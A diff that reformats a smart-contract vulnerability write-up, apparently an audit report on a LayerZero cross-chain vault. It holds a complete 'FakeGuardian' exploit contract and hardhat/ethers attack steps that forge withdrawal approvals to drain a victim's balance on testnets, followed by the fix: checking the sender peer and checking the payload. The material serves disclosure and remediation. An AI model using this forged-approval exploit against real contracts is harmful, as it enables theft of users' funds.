@@ -73,101 +73,113 @@ The ping-pong pattern is **completely bypassed** because the contract trusts any
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.22;
 
-import {OApp, Origin, MessagingFee} from "@layerzerolabs/oapp-evm/contracts/oapp/OApp.sol";
-import {OAppOptionsType3} from "@layerzerolabs/oapp-evm/contracts/oapp/libs/OAppOptionsType3.sol";
-import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
+import { OApp, Origin, MessagingFee } from "@layerzerolabs/oapp-evm/contracts/oapp/OApp.sol";
+import { OAppOptionsType3 } from "@layerzerolabs/oapp-evm/contracts/oapp/libs/OAppOptionsType3.sol";
+import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";
 
 /// @title FakeGuardian
 /// @notice Simple exploit contract that sends fake withdrawal approvals
 /// @dev Bypasses the guardian verification by sending fake WITHDRAWAL_APPROVAL messages
 contract FakeGuardian is OApp, OAppOptionsType3 {
+  // Message type for enforced options
+  uint16 public constant SEND = 1;
 
-    // Message type for enforced options
-    uint16 public constant SEND = 1;
+  // Message types (must match RivalsOappContract)
+  enum MessageType {
+    WITHDRAWAL_REQUEST,
+    WITHDRAWAL_APPROVAL
+  }
 
-    // Message types (must match RivalsOappContract)
-    enum MessageType {
-        WITHDRAWAL_REQUEST,
-        WITHDRAWAL_APPROVAL
-    }
+  constructor(
+    address _endpoint,
+    address _owner
+  ) OApp(_endpoint, _owner) Ownable(_owner) {}
 
-    constructor(
-        address _endpoint,
-        address _owner
-    ) OApp(_endpoint, _owner) Ownable(_owner) {}
+  /// @notice Send a fake approval to drain ANY user's funds from the vault
+  /// @param targetVaultEid Endpoint ID of the vault chain (Base Sepolia)
+  /// @param requestId The request ID to approve (from attacker's withdrawal request)
+  /// @param victimAddress The address of the victim whose funds to steal
+  /// @param amount The amount to drain from the victim
+  /// @param options Execution options for the message
+  function sendFakeApproval(
+    uint32 targetVaultEid,
+    bytes32 requestId,
+    address victimAddress,
+    uint256 amount,
+    bytes calldata options
+  ) external payable {
+    // Create fake approval payload with arbitrary user and amount
+    // This bypasses the guardian verification entirely!
+    bytes memory payload = abi.encode(
+      MessageType.WITHDRAWAL_APPROVAL,
+      requestId,
+      victimAddress, // Can be ANY address with vault balance
+      amount // Can be ANY amount up to victim's balance
+    );
 
-    /// @notice Send a fake approval to drain ANY user's funds from the vault
-    /// @param targetVaultEid Endpoint ID of the vault chain (Base Sepolia)
-    /// @param requestId The request ID to approve (from attacker's withdrawal request)
-    /// @param victimAddress The address of the victim whose funds to steal
-    /// @param amount The amount to drain from the victim
-    /// @param options Execution options for the message
-    function sendFakeApproval(
-        uint32 targetVaultEid,
-        bytes32 requestId,
-        address victimAddress,
-        uint256 amount,
-        bytes calldata options
-    ) external payable {
-        // Create fake approval payload with arbitrary user and amount
-        // This bypasses the guardian verification entirely!
-        bytes memory payload = abi.encode(
-            MessageType.WITHDRAWAL_APPROVAL,
-            requestId,
-            victimAddress,  // Can be ANY address with vault balance
-            amount          // Can be ANY amount up to victim's balance
-        );
+    // Combine options
+    bytes memory combinedOptions = combineOptions(
+      targetVaultEid,
+      SEND,
+      options
+    );
 
-        // Combine options
-        bytes memory combinedOptions = combineOptions(targetVaultEid, SEND, options);
+    // Send fake approval to vault
+    _lzSend(
+      targetVaultEid,
+      payload,
+      combinedOptions,
+      MessagingFee(msg.value, 0),
+      payable(msg.sender)
+    );
+  }
 
-        // Send fake approval to vault
-        _lzSend(
-            targetVaultEid,
-            payload,
-            combinedOptions,
-            MessagingFee(msg.value, 0),
-            payable(msg.sender)
-        );
-    }
+  /// @notice Quote fee for sending fake approval
+  function quoteFakeApproval(
+    uint32 targetVaultEid,
+    bytes32 requestId,
+    address victimAddress,
+    uint256 amount,
+    bytes calldata options
+  ) external view returns (uint256) {
+    bytes memory payload = abi.encode(
+      MessageType.WITHDRAWAL_APPROVAL,
+      requestId,
+      victimAddress,
+      amount
+    );
+    bytes memory combinedOptions = combineOptions(
+      targetVaultEid,
+      SEND,
+      options
+    );
+    MessagingFee memory fee = _quote(
+      targetVaultEid,
+      payload,
+      combinedOptions,
+      false
+    );
+    return fee.nativeFee;
+  }
 
-    /// @notice Quote fee for sending fake approval
-    function quoteFakeApproval(
-        uint32 targetVaultEid,
-        bytes32 requestId,
-        address victimAddress,
-        uint256 amount,
-        bytes calldata options
-    ) external view returns (uint256) {
-        bytes memory payload = abi.encode(
-            MessageType.WITHDRAWAL_APPROVAL,
-            requestId,
-            victimAddress,
-            amount
-        );
-        bytes memory combinedOptions = combineOptions(targetVaultEid, SEND, options);
-        MessagingFee memory fee = _quote(targetVaultEid, payload, combinedOptions, false);
-        return fee.nativeFee;
-    }
+  /// @notice Not needed for exploit, but required by OApp
+  function _lzReceive(
+    Origin calldata,
+    bytes32,
+    bytes calldata,
+    address,
+    bytes calldata
+  ) internal override {
+    // Do nothing - we only send messages, never receive
+  }
 
-    /// @notice Not needed for exploit, but required by OApp
-    function _lzReceive(
-        Origin calldata,
-        bytes32,
-        bytes calldata,
-        address,
-        bytes calldata
-    ) internal override {
-        // Do nothing - we only send messages, never receive
-    }
+  /// @notice Allow receiving ETH for gas payments
+  receive() external payable {}
 
-    /// @notice Allow receiving ETH for gas payments
-    receive() external payable {}
-
-    /// @notice Withdraw ETH
-    function withdraw() external onlyOwner {
-        payable(msg.sender).transfer(address(this).balance);
-    }
+  /// @notice Withdraw ETH
+  function withdraw() external onlyOwner {
+    payable(msg.sender).transfer(address(this).balance);
+  }
 }
 ```
 
@@ -255,7 +267,7 @@ npx hardhat run scripts/deploy-fake-guardian.ts --network sepolia
 // Connect to Sepolia
 const fakeGuardian = await ethers.getContractAt(
   "FakeGuardian",
-  "0xYourFakeGuardianAddress"
+  "0xYourFakeGuardianAddress",
 );
 
 // Set Base Sepolia vault as peer
@@ -264,7 +276,7 @@ const vaultAddressOnBase = "0xVaultAddressOnBaseSepolia";
 
 await fakeGuardian.setPeer(
   baseSepoliaEid,
-  ethers.utils.zeroPad(vaultAddressOnBase, 32)
+  ethers.utils.zeroPad(vaultAddressOnBase, 32),
 );
 ```
 
@@ -274,7 +286,7 @@ await fakeGuardian.setPeer(
 // Connect to Base Sepolia vault
 const vault = await ethers.getContractAt(
   "RivalsOappContract",
-  vaultAddressOnBase
+  vaultAddressOnBase,
 );
 
 // Build options
@@ -288,7 +300,7 @@ const pongFee = await vault.quoteWithdrawal(
   100, // amount
   sepoliaEid,
   "0x",
-  returnOptions
+  returnOptions,
 );
 
 const sendOptions = Options.newOptions()
@@ -301,7 +313,7 @@ const tx = await vault.requestWithdrawal(
   sepoliaEid, // guardian chain
   sendOptions,
   returnOptions,
-  { value: totalFee }
+  { value: totalFee },
 );
 
 const receipt = await tx.wait();
@@ -335,7 +347,7 @@ const fee = await fakeGuardian.quoteFakeApproval(
   requestId,
   victimAddress, // Victim's address
   amountToDrain, // Amount to steal from victim
-  approvalOptions
+  approvalOptions,
 );
 
 // Send fake approval specifying victim and amount!
@@ -345,12 +357,12 @@ const attackTx = await fakeGuardian.sendFakeApproval(
   victimAddress, // Steal from this victim
   amountToDrain, // Steal this much
   approvalOptions,
-  { value: fee }
+  { value: fee },
 );
 
 await attackTx.wait();
 console.log(
-  "✅ Fake approval sent! Vault will drain victim's funds to attacker."
+  "✅ Fake approval sent! Vault will drain victim's funds to attacker.",
 );
 ```
 
@@ -381,13 +393,11 @@ console.log("✅ Successfully drained", amountToDrain, "tokens from victim!");
 ### Attack Transactions
 
 1. **Withdrawal Request**:
-
    - TX: `0x...`
    - Network: Base Sepolia
    - Request ID: `0x...`
 
 2. **Fake Approval Sent**:
-
    - TX: `0x...`
    - Network: Sepolia
    - LayerZero Scan: [Link showing message delivery]
@@ -465,48 +475,47 @@ The fix requires **TWO changes** to address both vulnerabilities:
 
 ```solidity
 function _lzReceive(
-    Origin calldata _origin,
-    bytes32 /*_guid*/,
-    bytes calldata _payload,
-    address /*_executor*/,
-    bytes calldata /*_extraData*/
+  Origin calldata _origin,
+  bytes32 /*_guid*/,
+  bytes calldata _payload,
+  address /*_executor*/,
+  bytes calldata /*_extraData*/
 ) internal override {
-    MessageType messageType = abi.decode(_payload, (MessageType));
+  MessageType messageType = abi.decode(_payload, (MessageType));
 
-    if (messageType == MessageType.WITHDRAWAL_REQUEST) {
-        // ... existing code ...
+  if (messageType == MessageType.WITHDRAWAL_REQUEST) {
+    // ... existing code ...
+  } else if (messageType == MessageType.WITHDRAWAL_APPROVAL) {
+    // Decode approval (user and amount are still in payload, but we won't use them)
+    (, bytes32 requestId, address user, uint256 amount) = abi.decode(
+      _payload,
+      (MessageType, bytes32, address, uint256)
+    );
 
-    } else if (messageType == MessageType.WITHDRAWAL_APPROVAL) {
-        // Decode approval (user and amount are still in payload, but we won't use them)
-        (, bytes32 requestId, address user, uint256 amount) = abi.decode(
-            _payload,
-            (MessageType, bytes32, address, uint256)
-        );
+    WithdrawalRequest storage request = pendingWithdrawals[requestId];
+    require(!request.approved, "Already approved");
+    require(request.user != address(0), "Invalid request");
 
-        WithdrawalRequest storage request = pendingWithdrawals[requestId];
-        require(!request.approved, "Already approved");
-        require(request.user != address(0), "Invalid request");
+    // ✅ FIX 1: Verify approval came from trusted guardian peer
+    require(
+      _origin.sender == _getPeerOrRevert(_origin.srcEid),
+      "Approval must come from guardian"
+    );
 
-        // ✅ FIX 1: Verify approval came from trusted guardian peer
-        require(
-            _origin.sender == _getPeerOrRevert(_origin.srcEid),
-            "Approval must come from guardian"
-        );
+    // ✅ FIX 2: Validate payload data matches stored request
+    require(user == request.user, "User mismatch");
+    require(amount == request.amount, "Amount mismatch");
 
-        // ✅ FIX 2: Validate payload data matches stored request
-        require(user == request.user, "User mismatch");
-        require(amount == request.amount, "Amount mismatch");
+    // Now use stored values, not payload values
+    require(balances[request.user] >= request.amount, "Insufficient balance");
 
-        // Now use stored values, not payload values
-        require(balances[request.user] >= request.amount, "Insufficient balance");
+    request.approved = true;
+    balances[request.user] -= request.amount;
+    token.transfer(request.user, request.amount);
 
-        request.approved = true;
-        balances[request.user] -= request.amount;
-        token.transfer(request.user, request.amount);
-
-        emit WithdrawalExecuted(request.user, request.amount);
-        delete pendingWithdrawals[requestId];
-    }
+    emit WithdrawalExecuted(request.user, request.amount);
+    delete pendingWithdrawals[requestId];
+  }
 }
 ```
 
